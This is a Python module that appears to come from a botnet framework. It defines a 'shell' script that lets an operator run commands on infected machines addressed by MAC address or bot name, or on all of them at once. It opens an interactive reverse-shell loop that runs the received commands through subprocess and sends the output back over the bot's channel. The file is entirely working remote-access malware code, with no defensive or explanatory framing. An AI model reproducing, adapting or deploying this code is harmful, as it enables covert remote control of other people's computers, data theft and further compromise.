import os
import time
import threading
import subprocess


from .. import BotNet, Context


@BotNet.default_script(script_version="0.0.2")
def shell(context: Context) -> str:
    """
        `[mac-address] /shell` -> open shell session
        or
        `[mac-address] /shell [command]`-> run command and exit

        or
        `[BOT-NAME] /shell` -> open shell session
        or
        `[BOT-NAME] /shell [command]`-> run command and exit

    Example input command:
         `94945035671481 /shell`  \n
         `94945035671481 /shell ls .`\n
         `94945035671481 /shell ping google.com -c 10`

        or
         `/shell ping google.com -c 10` -> Run command in all systems


    special condition:
        `/shell cd [path]` -> run python change directory, not run orginal cd command \n
    """
    engine = context.engine

    if len(context.command) > 0:
        res = __runcommand_in_thread(context.command, engine)
        if res != None:
            engine.send(res, context.system_info(minimal=True), reply_to_last_message=True)
        return

    repeat = 0
    time_out = 500
    sleep_time = 2
    exit_code = "TIME_OUT"

    engine.send(f"start reverse shell\nfor EXIT send `\exit`", context.system_info(), reply_to_last_message=True)

    while repeat < time_out:

        command = engine.receive()

        if not _valid_command(command):
            if repeat == 0:
                engine.send(f"{os.getcwd()}=>")
            time.sleep(sleep_time)
            repeat += 1
            continue

        if command[0] == "\exit":
            exit_code = "0"
            break

        else:
            res = __runcommand_in_thread(command, engine)

            if res != None:
                engine.send(res)
            engine.send(f"{os.getcwd()}=>")

    return f"reverse shell EXIT [{exit_code}]"


def _valid_command(command) -> bool:
    if type(command) != list:
        return False

    if len(command) < 1:
        return False

    return True


def _cd(command: list[str]) -> str:
    if len(command) >= 2:
        path = command[1]
    else:
        path = " "

    try:
        os.chdir(path)
        return f"current_route: {os.getcwd()}"

    except FileNotFoundError as error:
        return error
    except Exception as error:
        return error


def __runcommand_in_thread(command: list[str], engine, timeout: int = 6) -> None:
    """Run commands in thread"""

    # override command cd
    if command[0] == "cd":
        return _cd(command)

    else:
        tread = threading.Thread(target=_runcommand, args=[command, engine])
        tread.start()

        for _ in range(timeout):
            if tread.is_alive():
                time.sleep(1)
                continue
            else:
                return None

        return "Your command is running in the background and you will get the results when it is done."


def _runcommand(command: list[str], engine):
    """run command by subprocess.getstatusoutput
    and send resaults by engine.send method"""

    try:
        command = " ".join(command)
        exit_code, result = subprocess.getstatusoutput(command)

        output = f"""
- command: {command}
- exit_code: {exit_code} 
- result:
{result}
        """

        engine.send(output)

    except Exception as e:
        engine.send(e)
